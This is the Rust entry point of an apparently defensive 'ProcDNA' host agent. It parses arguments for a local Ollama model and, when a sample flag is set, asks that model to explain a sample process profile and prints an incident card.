use anyhow::{Context, Result};
use clap::Parser;
use procdna_common::{ProcessPassport, RiskReason};
use serde_json::json;

#[derive(Parser, Debug)]
#[command(name = "procdna-agent")]
#[command(about = "ProcDNA single-host MVP agent")]
struct Args {
    #[arg(long, default_value = "http://127.0.0.1:11434")]
    ollama_url: String,

    #[arg(long, default_value = "qwen3.5:4b")]
    model: String,

    #[arg(long)]
    sample_ai: bool,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    if args.sample_ai {
        let passport = sample_process_passport();

        let ai_report = explain_with_local_llm(
            &args.ollama_url,
            &args.model,
            &passport,
        )
        .await?;

        print_incident_card(&passport, &ai_report);
        return Ok(());
    }

    println!("ProcDNA Agent starting...");
    println!("Mode: single-host MVP");
    println!("Next: run with --sample-ai to test local LLM integration.");
    Ok(())
}

